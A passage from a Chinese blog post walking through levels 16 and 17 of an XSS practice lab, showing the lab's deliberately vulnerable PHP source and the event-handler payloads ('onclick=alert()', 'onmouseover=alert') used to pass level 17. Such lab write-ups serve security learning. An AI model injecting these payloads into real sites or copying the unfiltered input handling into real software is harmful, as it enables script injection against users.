class="string">&quot;level17.php?arg01=a&amp;arg02=b&quot;</span>; </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level16&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level16&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$str</span> = <span class="title function_ invoke__">strtolower</span>(<span class="variable">$_GET</span>[<span class="string">&quot;keyword&quot;</span>]);</span><br><span class="line"><span class="variable">$str2</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;script&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str</span>);</span><br><span class="line"><span class="variable">$str3</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot; &quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str2</span>);</span><br><span class="line"><span class="variable">$str4</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str3</span>);</span><br><span class="line"><span class="variable">$str5</span>=<span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;	&quot;</span>,<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="variable">$str4</span>);</span><br><span class="line"><span class="comment">//多个替换过滤  后端过滤了空格-&gt;&amp;nbsp;  未过滤换行符</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;center&gt;&quot;</span>.<span class="variable">$str5</span>.<span class="string">&quot;&lt;/center&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;center&gt;&lt;img src=level16.png&gt;&lt;/center&gt;</span><br><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h3 align=center&gt;payload的长度:&quot;</span>.<span class="title function_ invoke__">strlen</span>(<span class="variable">$str5</span>).<span class="string">&quot;&lt;/h3&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><p>解题思路：</p>
<p>检查源码：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_59.png" class="" title="在这里插入图片描述">
<p>修改地址栏的b,源码也对应修改：</p>
<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_60.png" class="" title="在这里插入图片描述">
<h3 id="趣事-2"><a href="#趣事-2" class="headerlink" title="*趣事"></a>*趣事</h3><p>将b修改为：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123 onclick=alert()</span><br></pre></td></tr></table></figure>

<img src="/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_61.png" class="" title="在这里插入图片描述">

<ul>
<li>onclick 成一个属性</li>
</ul>
<p>输入：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">123 onmouseover=alert(&quot;123&quot;)</span><br></pre></td></tr></table></figure>

<p>鼠标悬放即可通关</p>
<p>源码分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">&quot;content-type&quot;</span> content=<span class="string">&quot;text/html;charset=utf-8&quot;</span>&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)  </span></span><br><span class="line"><span class="function"></span>&#123;     </span><br><span class="line"><span class="title function_ invoke__">confirm</span>(<span class="string">&quot;完成的不错！&quot;</span>); </span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level17&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align=center&gt;欢迎来到level17&lt;/h1&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;display_errors&quot;</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;embed src=xsf01.swf?&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg01&quot;</span>]).<span class="string">&quot;=&quot;</span>.<span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$_GET</span>[<span class="string">&quot;arg02&quot;</span>]).<span class="string">&quot; width=100% heigth=100%&gt;&quot;</span>;</span><br><span class="line"><span class="comment">//变量获取之后，没有经过过滤就拼接</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;h2 align=center&gt;成功后，&lt;a href=level18.php?arg01=a&amp;arg02=b&gt;点我进入下一关&lt;/a&gt;&lt;/h2&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<hr>
<h1 id="服务器设置"><a href="#服务器设置" class="headerlink" title="服务器设置"></a>服务器设置</h1><p>开启php扩展设置php_exif  –&gt;图片读取功能</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/XSS/" rel="tag"># XSS</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/12/10/git_note/" rel="prev" title="Git-Note">
                  <i class="fa fa-angle-left"></i> Git-Note
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2025/11/08/%E8%BD%AF%E8%80%83(%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E5%B7%A5%E7%A8%8B%E5%B8%88)/" rel="next" title="软考(信息安全工程师)">
                  软考(信息安全工程师) <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






    <div class="comments utterances-container"></div>
</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">ZQ-Rookie-Hacker</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
      <span>站点总字数：</span>
    <span title="站点总字数">120k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
      <span>站点阅读时长 &asymp;</span>
    <span title="站点阅读时长">6:39</span>
  </span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>
  <div class="sidebar-dimmer"></div>
  <div class="back-to-top" role="button" aria-label="返回顶部">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>
<script class="next-config" data-name="utterances" type="application/json">{"enable":true,"repo":"ZQ-Rookie-Hacker/ZQ-Rookie-Hacker.github.io","issue_term":"pathname","theme":"preferred-color-scheme","label":"comment"}</script>
<script src="/js/third-party/comments/utterances.js" defer></script>

</body>
</html>
